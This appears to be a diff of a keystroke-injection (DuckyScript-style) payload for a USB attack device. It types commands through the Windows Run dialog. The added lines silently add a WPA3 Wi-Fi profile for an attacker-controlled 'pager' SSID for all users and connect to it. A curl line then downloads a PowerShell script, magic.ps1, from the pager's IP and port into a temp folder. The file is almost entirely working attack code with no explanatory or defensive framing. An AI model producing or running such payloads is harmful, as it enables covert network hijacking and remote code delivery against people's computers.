@@ -1,7 +1,11 @@
 DELAY 1000
 windows r
 DELAY 1000
-STRINGLN cmd /c mkdir "%TEMP%\wifi" 2>nul & curl -o "%TEMP%\wifi\magic.ps1" http://<PAGER IP>:42/files/magic.ps1
+STRINGLN powershell -Command "$xml='<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>YOUR PAGER SSID</name><SSIDConfig><SSID><name>YOUR PAGER SSID</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA3SAE</authentication><encryption>AES</encryption></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>2950x685876</keyMaterial></sharedKey></security></MSM></WLANProfile>';$t=[System.IO.Path]::GetTempFileName();[System.IO.File]::WriteAllText($t,$xml);netsh wlan add profile filename=\"$t\" user=all;Remove-Item $t -Force;netsh wlan connect name=\"YOUR PAGER SSID\""
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN cmd /c mkdir "%TEMP%\wifi" 2>nul & curl -o "%TEMP%\wifi\magic.ps1" http://YOUR PAGER IP:YOUR PAGER PORT/files/magic.ps1
 DELAY 1000
 windows r
 DELAY 1000
